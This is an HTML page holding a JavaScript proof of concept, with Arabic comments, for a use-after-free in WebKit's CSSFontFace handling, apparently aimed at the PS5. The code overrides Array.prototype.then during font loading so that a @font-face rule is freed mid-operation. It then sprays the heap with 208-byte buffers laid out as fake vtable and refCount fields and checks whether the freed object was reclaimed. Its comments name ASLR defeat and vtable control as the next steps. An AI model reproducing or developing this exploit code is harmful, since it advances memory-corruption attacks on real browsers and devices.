<!DOCTYPE html>
<html>
<body>
<h2>PoC 13: UAF Confirmation via Stress + GC</h2>
<button onclick="runStress()">ابدأ Stress Test</button>
<div id="out" style="font-family: monospace; white-space: pre; background: #000; color: #0f0; padding: 10px; min-height: 600px;"></div>

<script>
let logs = [];
function log(msg) {
    logs.push(msg);
    document.getElementById('out').textContent = logs.join('\n');
}

// CSSFontFace size on WebKit-1200 is ~0xC8 (200 bytes)
// bmalloc size classes: 192, 208, 224, 256...
// نستخدم 208 bytes spray (closest size class)
const SPRAY_SIZE = 208;
const SPRAY_COUNT = 10000;
const STRESS_ITERATIONS = 50;

// Heap spray بـ ArrayBuffers بحجم CSSFontFace
function heapSpray() {
    const spray = [];
    const marker = 0xDEADBEEFCAFEBABEn;
    
    for (let i = 0; i < SPRAY_COUNT; i++) {
        const buf = new ArrayBuffer(SPRAY_SIZE);
        const view = new BigUint64Array(buf);
        
        // Marker في البداية عشان نعرف لو الـ reclaim نجح
        view[0] = marker;
        view[1] = marker + BigInt(i);
        
        // محاكاة vtable pointer (placeholder)
        // على PS5 يحتاج ASLR defeat
        view[2] = 0x4141414141414141n;
        
        // محاكاة refCount
        view[3] = 1n;
        
        // محاكاة m_status = Success (3)
        view[0x8A / 8] = 3n;
        
        spray.push(buf);
    }
    return spray;
}

function forceGC() {
    // GC pressure عبر allocation + release
    const pressure = [];
    for (let i = 0; i < 100; i++) {
        pressure.push(new ArrayBuffer(1024 * 1024)); // 1MB
    }
    pressure.length = 0;
    
    // Force synchronous GC (WebKit behavior)
    document.body.offsetTop;
    getComputedStyle(document.body).width;
}

async function runOnce(iteration) {
    return new Promise((resolve) => {
        const style = document.createElement('style');
        style.textContent = `
            @font-face { font-family: "stress"; src: local("Arial"); unicode-range: U+0041; }
            @font-face { font-family: "stress"; src: local("Arial"); unicode-range: U+0042; }
        `;
        document.head.appendChild(style);
        
        const probe = document.createElement('span');
        probe.textContent = 'AB';
        probe.style.fontFamily = 'stress';
        document.body.appendChild(probe);
        document.body.offsetTop;
        
        let fired = false;
        let sprayHolder = null;
        
        const saved = Object.getOwnPropertyDescriptor(Array.prototype, 'then');
        
        function handler() {
            if (fired) return;
            fired = true;
            
            try {
                // حذف الـ rule → تحرير CSSFontFace
                style.sheet.deleteRule(0);
                
                // Heap spray فوراً
                sprayHolder = heapSpray();
                
                // Force style update
                document.body.offsetTop;
                getComputedStyle(probe).fontFamily;
            } catch(e) {}
            
            // Restore
            if (saved) Object.defineProperty(Array.prototype, 'then', saved);
            else delete Array.prototype.then;
        }
        
        Object.defineProperty(Array.prototype, 'then', {
            configurable: true,
            get() {
                handler();
                return saved?.value;
            }
        });
        
        document.fonts.load('16px "stress"', 'AB').then((faces) => {
            const result = {
                iteration,
                faces: faces.length,
                fired,
                sprayIntact: sprayHolder ? checkSprayIntegrity(sprayHolder) : null
            };
            
            // Cleanup
            style.remove();
            probe.remove();
            sprayHolder = null;
            
            resolve(result);
        });
    });
}

function checkSprayIntegrity(spray) {
    let corrupted = 0;
    let reclaimed = 0;
    
    for (let i = 0; i < Math.min(spray.length, 100); i++) {
        const view = new BigUint64Array(spray[i]);
        
        if (view[0] !== 0xDEADBEEFCAFEBABEn) {
            corrupted++;
            // هذا دليل على reclaim ناجح!
            if (view[0] === 0n || view[0] > 0x1000000000000n) {
                reclaimed++;
            }
        }
    }
    
    return { corrupted, reclaimed, total: spray.length };
}

async function runStress() {
    logs = [];
    log('=== UAF Stress Test ===\n');
    log(`Iterations: ${STRESS_ITERATIONS}`);
    log(`Spray size: ${SPRAY_SIZE} bytes`);
    log(`Spray count: ${SPRAY_COUNT}\n`);
    
    let totalCorrupted = 0;
    let totalReclaimed = 0;
    let facesCount = {};
    
    for (let i = 0; i < STRESS_ITERATIONS; i++) {
        // Force GC بين المحاولات
        if (i % 5 === 0) forceGC();
        
        const result = await runOnce(i);
        
        log(`Iter ${i}: faces=${result.faces}, fired=${result.fired}`);
        
        if (result.sprayIntact) {
            totalCorrupted += result.sprayIntact.corrupted;
            totalReclaimed += result.sprayIntact.reclaimed;
            
            if (result.sprayIntact.corrupted > 0) {
                log(`  🔥 ${result.sprayIntact.corrupted} spray objects corrupted!`);
                log(`  💀 ${result.sprayIntact.reclaimed} possibly reclaimed!`);
            }
        }
        
        facesCount[result.faces] = (facesCount[result.faces] || 0) + 1;
        
        // تأخير قصير
        await new Promise(r => setTimeout(r, 50));
    }
    
    log('\n=== Summary ===');
    log(`Faces count distribution:`);
    Object.entries(facesCount).forEach(([count, freq]) => {
        log(`  faces=${count}: ${freq} times`);
    });
    
    log(`\nTotal spray corrupted: ${totalCorrupted}`);
    log(`Total possibly reclaimed: ${totalReclaimed}`);
    
    if (totalReclaimed > 0) {
        log('\n🎉 UAF CONFIRMED! Spray objects were reclaimed by CSSFontFace!');
        log('الخطوة التالية: التحكم في الـ reclaimed object قبل الـ vtable check');
    } else if (totalCorrupted > 0) {
        log('\n⚠️ Partial success: Spray corrupted but not clearly reclaimed');
        log('جرب spray بحجم مختلف (224 bytes أو 256 bytes)');
    } else {
        log('\n❌ No evidence of UAF reclaim');
        log('جرب: زيادة STRESS_ITERATIONS، أو استخدام workers للـ timing');
    }
}
</script>
</body>
</html>
